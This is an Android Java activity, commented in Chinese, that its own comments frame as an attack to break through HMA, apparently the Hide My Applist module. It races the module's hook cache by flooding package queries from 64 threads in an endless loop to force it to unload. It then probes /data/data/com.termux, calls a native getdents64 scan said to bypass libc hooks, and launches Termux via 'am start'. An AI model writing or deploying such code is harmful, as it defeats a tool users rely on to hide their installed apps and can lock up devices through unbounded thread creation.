package com.example.baseapp;

import androidx.appcompat.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;
import android.content.pm.PackageManager;
import java.io.File;
import java.util.concurrent.Executors;

public class MainActivity extends AppCompatActivity {

    private static final String TAG = "HMA_TERMINATOR";
    private static final String TARGET = "com.termux";

    static {
        System.loadLibrary("native-lib");
    }

    // JNI 接口：使用底层 getdents64 绕过 libc Hook
    public native void rawDirectoryScan();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Log.w(TAG, "=== 爆破程序启动：准备击穿 HMA 防御层 ===");

        // 核心爆破逻辑：64 线程高频冲击 uidHideCache
        // 目标：触发 ConcurrentModificationException 迫使 HMA 执行 unload()
        Executors.newFixedThreadPool(64).execute(() -> {
            while (true) {
                for (int i = 0; i < 64; i++) {
                    new Thread(() -> {
                        try {
                            // 1. 疯狂请求，冲击 HMA 的 ArrayList 临界区
                            getPackageManager().getPackageInfo(TARGET, 0);
                        } catch (Exception e) {
                            // 捕获并发异常，但这正是我们要制造的“混乱”
                        }

                        // 2. 实时探测：检查文件系统是否已经因为 Hook 卸载而暴露
                        if (new File("/data/data/" + TARGET).exists()) {
                            Log.e(TAG, "!!! 突破成功 !!! 物理路径已暴露，HMA 防线瓦解！");
                            // 此时调用 Native 扫描，双重确认
                            rawDirectoryScan();
                        }
                    }).start();
                }
                
                // 给 CPU 留一点喘息时间，防止整个 Android UI 彻底卡死
                try { Thread.sleep(50); } catch (InterruptedException e) {}
            }
        });

        // 辅助爆破：尝试通过匿名路径启动
        new Thread(() -> {
            try {
                Log.w(TAG, ">>> 执行匿名 Context 绕过尝试...");
                Runtime.getRuntime().exec("am start -n com.termux/.app.TermuxActivity");
            } catch (Exception e) {
                Log.e(TAG, "am start 尝试失败");
            }
        }).start();
    }
}
